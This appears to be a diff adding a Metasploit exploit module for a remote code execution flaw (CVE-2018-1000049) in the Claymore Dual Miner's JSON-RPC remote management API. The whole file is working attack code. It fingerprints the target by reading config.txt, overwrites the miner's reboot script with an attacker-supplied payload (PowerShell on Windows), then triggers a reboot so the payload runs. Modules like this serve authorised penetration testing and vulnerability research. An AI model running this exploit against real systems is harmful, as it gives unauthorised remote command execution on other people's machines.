@@ -1,0 +1,185 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/exploit/powershell'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'Nanopool Claymore Dual Miner APIs RCE',
+      'Description'     => %q{
+        This module takes advantage of miner remote manager APIs to exploit an RCE vulnerability.
+      },
+      'Author'          =>
+        [
+          'reversebrain@snado', # Vulnerability reporter
+          'phra@snado'          # Metasploit module
+        ],
+      'License'         => MSF_LICENSE,
+      'References'      =>
+        [
+          ['EDB', '44638'],
+          ['CVE', '2018-1000049'],
+          ['URL', 'https://reversebrain.github.io/2018/02/01/Claymore-Dual-Miner-Remote-Code-Execution/']
+        ],
+      'Platform'        => ['win', 'linux'],
+      'Targets'         =>
+        [
+          [ 'Automatic Target', { 'auto' => true }],
+          [ 'Linux',
+            {
+              'Platform' => 'linux',
+              'Arch' => ARCH_X64,
+              'CmdStagerFlavor' => [ 'bourne', 'echo', 'printf' ]
+            }
+          ],
+          [ 'Windows',
+            {
+              'Platform' => 'windows',
+              'Arch' => ARCH_X64,
+              'CmdStagerFlavor' => [ 'certutil', 'vbs' ]
+            }
+          ]
+        ],
+      'Payload' =>
+        {
+          'BadChars' => "\x00"
+        },
+      'DisclosureDate'  => 'Feb 09 2018',
+      'DefaultTarget'   => 0))
+
+    register_options(
+      [
+        OptPort.new('RPORT', [ true, 'Set miner port', 3333 ])
+      ])
+    deregister_options('URIPATH', 'SSL', 'SSLCert', 'SRVPORT', 'SRVHOST')
+  end
+
+  def select_target
+    data = {
+      "id"      => 0,
+      "jsonrpc" => '2.0',
+      "method"  => 'miner_getfile',
+      "params"  => ['config.txt']
+    }.to_json
+    connect
+    sock.put(data)
+    buf = sock.get_once || ''
+    tmp = StringIO.new
+    tmp << buf
+    tmp2 = tmp.string
+    hex = ''
+    if tmp2.scan(/\w+/)[7]
+      return self.targets[2]
+    elsif tmp2.scan(/\w+/)[5]
+      return self.targets[1]
+    else
+      return nil
+    end
+  end
+
+  def check
+    target = select_target
+    if target.nil?
+      return Exploit::CheckCode::Safe
+    end
+    data = {
+      "id"      => 0,
+      "jsonrpc" => '2.0',
+      "method"  => 'miner_getfile',
+      "params"  => ['config.txt']
+    }.to_json
+    connect
+    sock.put(data)
+    buf = sock.get_once || ''
+    tmp = StringIO.new
+    tmp << buf
+    tmp2 = tmp.string
+    hex = ''
+    case target['Platform']
+    when 'linux'
+      hex = tmp2.scan(/\w+/)[5]
+    when 'windows'
+      hex = tmp2.scan(/\w+/)[7]
+    end
+    str = Rex::Text.hex_to_raw(hex)
+    if str.include?('WARNING')
+      return Exploit::CheckCode::Vulnerable
+    else
+      return Exploit::CheckCode::Detected
+    end
+  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
+    vprint_error(e.message)
+    return Exploit::CheckCode::Unknown
+  ensure
+    disconnect
+  end
+
+  def execute_command(cmd, opts = {})
+    target = select_target
+    case target['Platform']
+    when 'linux'
+      cmd = Rex::Text.to_hex(cmd, '')
+      upload = {
+        "id"      => 0,
+        "jsonrpc" => '2.0',
+        "method"  => 'miner_file',
+        "params"  => ['reboot.bash', "#{cmd}"]
+      }.to_json
+    when 'windows'
+      cmd = Rex::Text.to_hex(cmd_psh_payload(payload.encoded, payload_instance.arch.first), '')
+      upload = {
+        "id"      => 0,
+        "jsonrpc" => '2.0',
+        "method"  => 'miner_file',
+        "params"  => ['reboot.bat', "#{cmd}"]
+      }.to_json
+    end
+
+    connect
+    sock.put(upload)
+    buf = sock.get_once || ''
+    trigger_vulnerability
+  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
+    fail_with(Failure::UnexpectedReply, e.message)
+  ensure
+    disconnect
+  end
+
+  def trigger_vulnerability
+    execute = {
+      "id"      => 0,
+      "jsonrpc" => '2.0',
+      "method"  => 'miner_reboot'
+    }.to_json
+    connect
+    sock.put(execute)
+    buf = sock.get_once || ''
+    disconnect
+  end
+
+  def exploit
+    target = select_target
+    if target.nil?
+      fail_with(Failure::NoTarget, 'No matching target')
+    end
+    if (target['Platform'].eql?('linux') && payload_instance.name !~ /linux/i) ||
+      (target['Platform'].eql?('windows') && payload_instance.name !~ /windows/i)
+      fail_with(Failure::BadConfig, "Selected payload '#{payload_instance.name}' is not compatible with target operating system '#{target.name}'")
+    end
+    case target['Platform']
+    when 'linux'
+      execute_cmdstager(flavor: :echo, linemax: 100000)
+    when 'windows'
+      execute_cmdstager(flavor: :vbs, linemax: 100000)
+    end
+  end
+end
